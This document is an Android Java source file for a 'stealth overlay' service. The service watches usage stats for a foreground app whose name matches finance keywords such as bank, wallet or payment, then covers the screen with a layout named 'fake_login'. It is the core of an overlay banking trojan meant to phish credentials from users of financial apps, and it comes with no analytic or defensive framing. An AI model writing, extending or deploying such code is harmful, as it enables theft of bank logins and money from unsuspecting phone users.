package com.example.stealthoverlay;

import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import java.util.List;
import java.util.SortedMap;
import java.util.TreeMap;

public class SmartOverlayService extends OverlayService {

    private final String[] financeKeywords = {"bank", "wallet", "finance", "payment", "cash", "money"};

    @Override
    public void onCreate() {
        super.onCreate();
        Handler handler = new Handler();
        handler.postDelayed(this::checkForegroundApp, 3000);  // Delay before checking app
    }

    private void checkForegroundApp() {
        String currentApp = getForegroundAppPackage();
        if (currentApp != null) {
            for (String keyword : financeKeywords) {
                if (currentApp.toLowerCase().contains(keyword)) {
                    showOverlay();
                    break;
                }
            }
        }
    }

    private void showOverlay() {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        LayoutInflater inflater = LayoutInflater.from(this);
        View overlayView = inflater.inflate(R.layout.fake_login, null);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.LEFT;
        wm.addView(overlayView, params);
    }

    private String getForegroundAppPackage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 10, time);
            if (appList != null && !appList.isEmpty()) {
                SortedMap<Long, UsageStats> sortedMap = new TreeMap<>();
                for (UsageStats usageStats : appList) {
                    sortedMap.put(usageStats.getLastTimeUsed(), usageStats);
                }
                if (!sortedMap.isEmpty()) {
                    return sortedMap.get(sortedMap.lastKey()).getPackageName();
                }
            }
        }
        return null;
    }
}
